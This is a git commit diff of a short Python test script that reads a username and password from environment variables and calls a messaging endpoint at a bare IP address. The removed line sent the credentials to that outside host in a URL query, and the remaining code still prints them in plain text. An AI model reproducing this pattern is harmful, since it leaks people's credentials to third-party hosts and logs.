8b4c2d46b6d354b25fdb40f3fe0b97d2aef54569
ninhua <87905129+ninhua@users.noreply.github.com>
2021-10-17 11:44:34 +0800

    Update ceshi.py

--- ceshi.py
+++ ceshi.py
@@ -7,6 +7,6 @@ import utils
 from urllib.parse import urlencode
 username, password = str(os.environ['WZXY_USERNAME']), str(os.environ['WZXY_PASSWORD'])
 print(username + password)
-url = ("http://43.252.209.207:5700/send_msg?user_id=2377950630&message=" + username + password)
+url = ("http://43.252.209.207:5700/send_msg?user_id=2377950630&message=123")
 res = requests.get(url)
 print(res.text)
